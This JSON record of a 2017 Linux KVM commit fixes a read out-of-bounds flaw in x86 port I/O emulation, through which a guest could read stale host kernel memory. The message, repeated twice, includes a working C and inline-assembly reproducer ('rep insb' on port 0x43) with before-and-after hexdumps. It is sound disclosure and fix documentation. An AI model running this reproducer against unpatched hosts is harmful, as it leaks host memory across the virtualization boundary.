{
  "hash": "cbfc6c9184ce71b52df4b1d82af5afc81a709178",
  "hash_short": "cbfc6c91",
  "subject": "KVM: X86: Fix read out-of-bounds vulnerability in kvm pio emulation",
  "body": "Huawei folks reported a read out-of-bounds vulnerability in kvm pio emulation.\n\n- \"inb\" instruction to access PIT Mod/Command register (ioport 0x43, write only,\n  a read should be ignored) in guest can get a random number.\n- \"rep insb\" instruction to access PIT register port 0x43 can control memcpy()\n  in emulator_pio_in_emulated() to copy max 0x400 bytes but only read 1 bytes,\n  which will disclose the unimportant kernel memory in host but no crash.\n\nThe similar test program below can reproduce the read out-of-bounds vulnerability:\n\nvoid hexdump(void *mem, unsigned int len)\n{\n        unsigned int i, j;\n\n        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)\n        {\n                /* print offset */\n                if(i % HEXDUMP_COLS == 0)\n                {\n                        printf(\"0x%06x: \", i);\n                }\n\n                /* print hex data */\n                if(i < len)\n                {\n                        printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n                }\n                else /* end of block, just aligning for ASCII dump */\n                {\n                        printf(\"   \");\n                }\n\n                /* print ASCII dump */\n                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))\n                {\n                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)\n                        {\n                                if(j >= len) /* end of block, not really printing */\n                                {\n                                        putchar(' ');\n                                }\n                                else if(isprint(((char*)mem)[j])) /* printable char */\n                                {\n                                        putchar(0xFF & ((char*)mem)[j]);\n                                }\n                                else /* other char */\n                                {\n                                        putchar('.');\n                                }\n                        }\n                        putchar('\\n');\n                }\n        }\n}\n\nint main(void)\n{\n\tint i;\n\tif (iopl(3))\n\t{\n\t\terr(1, \"set iopl unsuccessfully\\n\");\n\t\treturn -1;\n\t}\n\tstatic char buf[0x40];\n\n\t/* test ioport 0x40,0x41,0x42,0x43,0x44,0x45 */\n\n\tmemset(buf, 0xab, sizeof(buf));\n\n\tasm volatile(\"push %rdi;\");\n\tasm volatile(\"mov %0, %%rdi;\"::\"q\"(buf));\n\n\tasm volatile (\"mov $0x40, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x41, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x42, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x43, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x44, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x45, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"pop %rdi;\");\n\thexdump(buf, 0x40);\n\n\tprintf(\"\\n\");\n\n\t/* ins port 0x40 */\n\n\tmemset(buf, 0xab, sizeof(buf));\n\n\tasm volatile(\"push %rdi;\");\n\tasm volatile(\"mov %0, %%rdi;\"::\"q\"(buf));\n\n\tasm volatile (\"mov $0x20, %rcx;\");\n\tasm volatile (\"mov $0x40, %rdx;\");\n\tasm volatile (\"rep insb;\");\n\n\tasm volatile (\"pop %rdi;\");\n\thexdump(buf, 0x40);\n\n\tprintf(\"\\n\");\n\n\t/* ins port 0x43 */\n\n\tmemset(buf, 0xab, sizeof(buf));\n\n\tasm volatile(\"push %rdi;\");\n\tasm volatile(\"mov %0, %%rdi;\"::\"q\"(buf));\n\n\tasm volatile (\"mov $0x20, %rcx;\");\n\tasm volatile (\"mov $0x43, %rdx;\");\n\tasm volatile (\"rep insb;\");\n\n\tasm volatile (\"pop %rdi;\");\n\thexdump(buf, 0x40);\n\n\tprintf(\"\\n\");\n\treturn 0;\n}\n\nThe vcpu->arch.pio_data buffer is used by both in/out instrutions emulation\nw/o clear after using which results in some random datas are left over in\nthe buffer. Guest reads port 0x43 will be ignored since it is write only,\nhowever, the function kernel_pio() can't distigush this ignore from successfully\nreads data from device's ioport. There is no new data fill the buffer from\nport 0x43, however, emulator_pio_in_emulated() will copy the stale data in\nthe buffer to the guest unconditionally. This patch fixes it by clearing the\nbuffer before in instruction emulation to avoid to grant guest the stale data\nin the buffer.\n\nIn addition, string I/O is not supported for in kernel device. So there is no\niteration to read ioport %RCX times for string I/O. The function kernel_pio()\njust reads one round, and then copy the io size * %RCX to the guest unconditionally,\nactually it copies the one round ioport data w/ other random datas which are left\nover in the vcpu->arch.pio_data buffer to the guest. This patch fixes it by\nintroducing the string I/O support for in kernel device in order to grant the right\nioport datas to the guest.\n\nBefore the patch:\n\n0x000000: fe 38 93 93 ff ff ab ab .8......\n0x000008: ab ab ab ab ab ab ab ab ........\n0x000010: ab ab ab ab ab ab ab ab ........\n0x000018: ab ab ab ab ab ab ab ab ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: f6 00 00 00 00 00 00 00 ........\n0x000008: 00 00 00 00 00 00 00 00 ........\n0x000010: 00 00 00 00 4d 51 30 30 ....MQ00\n0x000018: 30 30 20 33 20 20 20 20 00 3\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: f6 00 00 00 00 00 00 00 ........\n0x000008: 00 00 00 00 00 00 00 00 ........\n0x000010: 00 00 00 00 4d 51 30 30 ....MQ00\n0x000018: 30 30 20 33 20 20 20 20 00 3\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\nAfter the patch:\n\n0x000000: 1e 02 f8 00 ff ff ab ab ........\n0x000008: ab ab ab ab ab ab ab ab ........\n0x000010: ab ab ab ab ab ab ab ab ........\n0x000018: ab ab ab ab ab ab ab ab ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: d2 e2 d2 df d2 db d2 d7 ........\n0x000008: d2 d3 d2 cf d2 cb d2 c7 ........\n0x000010: d2 c4 d2 c0 d2 bc d2 b8 ........\n0x000018: d2 b4 d2 b0 d2 ac d2 a8 ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: 00 00 00 00 00 00 00 00 ........\n0x000008: 00 00 00 00 00 00 00 00 ........\n0x000010: 00 00 00 00 00 00 00 00 ........\n0x000018: 00 00 00 00 00 00 00 00 ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\nReported-by: Moguofang <moguofang@huawei.com>\nCc: Paolo Bonzini <pbonzini@redhat.com>\nCc: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>\nCc: Moguofang <moguofang@huawei.com>\nSigned-off-by: Wanpeng Li <wanpeng.li@hotmail.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>",
  "full_message": "KVM: X86: Fix read out-of-bounds vulnerability in kvm pio emulation\n\nHuawei folks reported a read out-of-bounds vulnerability in kvm pio emulation.\n\n- \"inb\" instruction to access PIT Mod/Command register (ioport 0x43, write only,\n  a read should be ignored) in guest can get a random number.\n- \"rep insb\" instruction to access PIT register port 0x43 can control memcpy()\n  in emulator_pio_in_emulated() to copy max 0x400 bytes but only read 1 bytes,\n  which will disclose the unimportant kernel memory in host but no crash.\n\nThe similar test program below can reproduce the read out-of-bounds vulnerability:\n\nvoid hexdump(void *mem, unsigned int len)\n{\n        unsigned int i, j;\n\n        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)\n        {\n                /* print offset */\n                if(i % HEXDUMP_COLS == 0)\n                {\n                        printf(\"0x%06x: \", i);\n                }\n\n                /* print hex data */\n                if(i < len)\n                {\n                        printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n                }\n                else /* end of block, just aligning for ASCII dump */\n                {\n                        printf(\"   \");\n                }\n\n                /* print ASCII dump */\n                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))\n                {\n                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)\n                        {\n                                if(j >= len) /* end of block, not really printing */\n                                {\n                                        putchar(' ');\n                                }\n                                else if(isprint(((char*)mem)[j])) /* printable char */\n                                {\n                                        putchar(0xFF & ((char*)mem)[j]);\n                                }\n                                else /* other char */\n                                {\n                                        putchar('.');\n                                }\n                        }\n                        putchar('\\n');\n                }\n        }\n}\n\nint main(void)\n{\n\tint i;\n\tif (iopl(3))\n\t{\n\t\terr(1, \"set iopl unsuccessfully\\n\");\n\t\treturn -1;\n\t}\n\tstatic char buf[0x40];\n\n\t/* test ioport 0x40,0x41,0x42,0x43,0x44,0x45 */\n\n\tmemset(buf, 0xab, sizeof(buf));\n\n\tasm volatile(\"push %rdi;\");\n\tasm volatile(\"mov %0, %%rdi;\"::\"q\"(buf));\n\n\tasm volatile (\"mov $0x40, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x41, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x42, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x43, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x44, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"mov $0x45, %rdx;\");\n\tasm volatile (\"in %dx,%al;\");\n\tasm volatile (\"stosb;\");\n\n\tasm volatile (\"pop %rdi;\");\n\thexdump(buf, 0x40);\n\n\tprintf(\"\\n\");\n\n\t/* ins port 0x40 */\n\n\tmemset(buf, 0xab, sizeof(buf));\n\n\tasm volatile(\"push %rdi;\");\n\tasm volatile(\"mov %0, %%rdi;\"::\"q\"(buf));\n\n\tasm volatile (\"mov $0x20, %rcx;\");\n\tasm volatile (\"mov $0x40, %rdx;\");\n\tasm volatile (\"rep insb;\");\n\n\tasm volatile (\"pop %rdi;\");\n\thexdump(buf, 0x40);\n\n\tprintf(\"\\n\");\n\n\t/* ins port 0x43 */\n\n\tmemset(buf, 0xab, sizeof(buf));\n\n\tasm volatile(\"push %rdi;\");\n\tasm volatile(\"mov %0, %%rdi;\"::\"q\"(buf));\n\n\tasm volatile (\"mov $0x20, %rcx;\");\n\tasm volatile (\"mov $0x43, %rdx;\");\n\tasm volatile (\"rep insb;\");\n\n\tasm volatile (\"pop %rdi;\");\n\thexdump(buf, 0x40);\n\n\tprintf(\"\\n\");\n\treturn 0;\n}\n\nThe vcpu->arch.pio_data buffer is used by both in/out instrutions emulation\nw/o clear after using which results in some random datas are left over in\nthe buffer. Guest reads port 0x43 will be ignored since it is write only,\nhowever, the function kernel_pio() can't distigush this ignore from successfully\nreads data from device's ioport. There is no new data fill the buffer from\nport 0x43, however, emulator_pio_in_emulated() will copy the stale data in\nthe buffer to the guest unconditionally. This patch fixes it by clearing the\nbuffer before in instruction emulation to avoid to grant guest the stale data\nin the buffer.\n\nIn addition, string I/O is not supported for in kernel device. So there is no\niteration to read ioport %RCX times for string I/O. The function kernel_pio()\njust reads one round, and then copy the io size * %RCX to the guest unconditionally,\nactually it copies the one round ioport data w/ other random datas which are left\nover in the vcpu->arch.pio_data buffer to the guest. This patch fixes it by\nintroducing the string I/O support for in kernel device in order to grant the right\nioport datas to the guest.\n\nBefore the patch:\n\n0x000000: fe 38 93 93 ff ff ab ab .8......\n0x000008: ab ab ab ab ab ab ab ab ........\n0x000010: ab ab ab ab ab ab ab ab ........\n0x000018: ab ab ab ab ab ab ab ab ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: f6 00 00 00 00 00 00 00 ........\n0x000008: 00 00 00 00 00 00 00 00 ........\n0x000010: 00 00 00 00 4d 51 30 30 ....MQ00\n0x000018: 30 30 20 33 20 20 20 20 00 3\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: f6 00 00 00 00 00 00 00 ........\n0x000008: 00 00 00 00 00 00 00 00 ........\n0x000010: 00 00 00 00 4d 51 30 30 ....MQ00\n0x000018: 30 30 20 33 20 20 20 20 00 3\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\nAfter the patch:\n\n0x000000: 1e 02 f8 00 ff ff ab ab ........\n0x000008: ab ab ab ab ab ab ab ab ........\n0x000010: ab ab ab ab ab ab ab ab ........\n0x000018: ab ab ab ab ab ab ab ab ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: d2 e2 d2 df d2 db d2 d7 ........\n0x000008: d2 d3 d2 cf d2 cb d2 c7 ........\n0x000010: d2 c4 d2 c0 d2 bc d2 b8 ........\n0x000018: d2 b4 d2 b0 d2 ac d2 a8 ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\n0x000000: 00 00 00 00 00 00 00 00 ........\n0x000008: 00 00 00 00 00 00 00 00 ........\n0x000010: 00 00 00 00 00 00 00 00 ........\n0x000018: 00 00 00 00 00 00 00 00 ........\n0x000020: ab ab ab ab ab ab ab ab ........\n0x000028: ab ab ab ab ab ab ab ab ........\n0x000030: ab ab ab ab ab ab ab ab ........\n0x000038: ab ab ab ab ab ab ab ab ........\n\nReported-by: Moguofang <moguofang@huawei.com>\nCc: Paolo Bonzini <pbonzini@redhat.com>\nCc: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>\nCc: Moguofang <moguofang@huawei.com>\nSigned-off-by: Wanpeng Li <wanpeng.li@hotmail.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>",
  "author_name": "Wanpeng Li",
  "author_email": "wanpeng.li@hotmail.com",
  "author_date": "Fri May 19 02:46:56 2017 -0700",
  "author_date_iso": "2017-05-19T02:46:56-07:00",
  "committer_name": "Radim Kr\u010dm\u00e1\u0159",
  "committer_email": "rkrcmar@redhat.com",
  "committer_date": "Fri May 19 19:59:26 2017 +0200",
  "committer_date_iso": "2017-05-19T19:59:26+02:00",
  "files_changed": [
    "arch/x86/kvm/x86.c"
  ],
  "files_changed_count": 1,
  "stats": [
    {
      "file": "arch/x86/kvm/x86.c",
      "insertions": 15,
      "deletions": 9
    }
  ],
  "total_insertions": 15,
  "total_deletions": 9,
  "total_changes": 24,
  "parents": [
    "e2c2206a18993bc9f62393d49c7b2066c3845b25"
  ],
  "branches": [
    "* development",
    "master",
    "remotes/origin/HEAD -> origin/master",
    "remotes/origin/master"
  ],
  "tags": [
    "v4.12",
    "v4.12-rc2",
    "v4.12-rc3",
    "v4.12-rc4",
    "v4.12-rc5",
    "v4.12-rc6",
    "v4.12-rc7",
    "v4.13",
    "v4.13-rc1",
    "v4.13-rc2"
  ],
  "is_merge": false,
  "security_info": {
    "cve_ids": [],
    "security_keywords": [
      "vulnerability"
    ]
  },
  "fix_type": "security",
  "file_results": [
    {
      "file": "arch/x86/kvm/x86.c",
      "pre_version": true,
      "post_version": true,
      "patch": true
    }
  ]
}